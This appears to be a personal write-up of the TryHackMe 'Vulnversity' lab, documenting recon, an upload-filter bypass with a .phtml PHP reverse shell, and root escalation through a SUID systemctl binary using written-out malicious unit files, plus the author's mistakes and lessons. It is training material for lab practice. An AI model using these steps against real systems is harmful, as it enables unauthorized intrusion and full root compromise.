# Vulnversity — TryHackMe — ROOT

**Date:** 2026-09-03
**Platform:** TryHackMe
**Outcome:** user + root
**Time:** ~1.5h
**Tools:** nmap, gobuster, php-reverse-shell (pentestmonkey), netcat, systemctl (SUID)

---

## 0. TL;DR chain

nmap (host ignored ping → -Pn) → web on non-standard 3333 → gobuster → /internal/ upload form →
extension filter → .phtml accepted → pentestmonkey reverse shell → www-data →
SUID /bin/systemctl → malicious oneshot unit runs as root → root

## 1. Recon

`nmap -sV` returned nothing: the box ignored host discovery. `-Pn` (skip discovery, assume host
up) exposed:

| Port | Service | Means | Therefore |
|---|---|---|---|
| 21 | vsftpd 3.0.5 | FTP | anon check — nothing here |
| 22 | OpenSSH 8.2p1 | login surface | later, once creds exist |
| 139/445 | Samba 4 | SMB | possible user enum — not needed |
| 3128 | Squid 4.10 | proxy | note, not a path |
| 3333 | Apache 2.4.41 | **web on non-standard port** | primary attack surface |

The lesson is the empty first scan: "no ports" ≠ "no box". Retry with -Pn before trusting silence.

## 2. Foothold (user)

1. **Did:** `gobuster dir -u http://IP:3333 -w dir-list-medium.txt -t 64`
   **Why:** Apache with a thin front page → hidden paths.
   **Result:** `/internal/` — a file **upload form**.

2. **Did:** tested PHP extensions on the upload; `.php` rejected, **`.phtml` accepted**.
   **Why:** filters that blocklist extensions usually miss alternate spellings.
   **Result:** a web-executable payload path.
   (Burp Intruder/Sniper didn't come together in time; with N=5 extensions, manual testing is
   the faster tool anyway.)

3. **Did:** pentestmonkey `php-reverse-shell`, IP edited, renamed `php-reverse-shell.phtml`,
   uploaded, `nc -lvnp 1234`, triggered via
   `http://IP:3333/internal/uploads/php-reverse-shell.phtml`
   **Result:** www-data reverse shell. user.txt under `/home/bill`.

## 3. Privilege escalation (root)

1. **Did:** SUID sweep — `find / -type f -perm -04000 -ls 2>/dev/null`; scanned for
   `-rwsr-xr-x root root` lines.
   **Result:** **/bin/systemctl** with the SUID bit — the only non-standard entry in the list.

2. **Did:** wrote a unit file and ran it through the SUID binary:
   ```
   cat > /tmp/root.service <<'EOF'
   [Service]
   Type=oneshot
   ExecStart=/bin/sh -c "id > /tmp/proof"
   [Install]
   WantedBy=multi-user.target
   EOF
   /bin/systemctl link /tmp/root.service
   /bin/systemctl start root.service
   cat /tmp/proof        → uid=0(root)
   ```
   **Why it works:** systemctl runs as root (SUID), and it follows the instructions in the unit
   file — so ExecStart executes as root. The exploit is a text file.

3. **Did:** second unit (`flag.service`) with
   `ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/r && chmod 644 /tmp/r"` → `cat /tmp/r`.
   **Result:** root flag.

Key concept: **a root service is not a root shell.** `whoami` stays www-data forever; the service
is a detached root process. The service gives you root *execution*, and you choose what to do
with it (read the flag, drop a SUID shell, etc.).

## 4. Misses and dead ends

- `/tmp/proof` contained `uid=0(root)` — the exploit had already worked — and I read it as
  "nothing works" because `whoami` still said www-data. Third box in a row where the answer was
  on screen and I read past it.
- Pasted the whole multi-command block into a no-TTY netcat shell at once; the heredoc got
  mangled (`>` continuation prompts). One command at a time, Ctrl-C out of continuations.
- `nano` in a no-TTY shell → "Error opening terminal: unknown". No TTY means no editors; use
  cat/printf, or upgrade the shell (`python3 -c 'import pty; pty.spawn("/bin/sh")'`).
- `chmod +x` on a `.service` file — meaningless; unit files are configs, not scripts.
- Ran the **previous box's play** here: fake `curl` + `PATH=/tmp` export. Kenobi had a menu
  binary calling curl; this box has none. SUID asks "what does *this* binary do?".
- `nmap -Pn` called "stealth" — it's not; it skips host discovery. Right flag, wrong mental model.
- AI used twice mid-run (username lookup, scanning the SUID list); both times the answer was
  already in my own output — self-caught both times.

## 5. Lessons

1. Quote the output before declaring failure. If there's no pasted error, there was no error.
2. Know what each primitive gives you: a root service gives root *execution*, not a root shell —
   then pick your finisher deliberately.
3. Don't replay the last box. Every SUID, every service, every port: ask what *this* thing does.
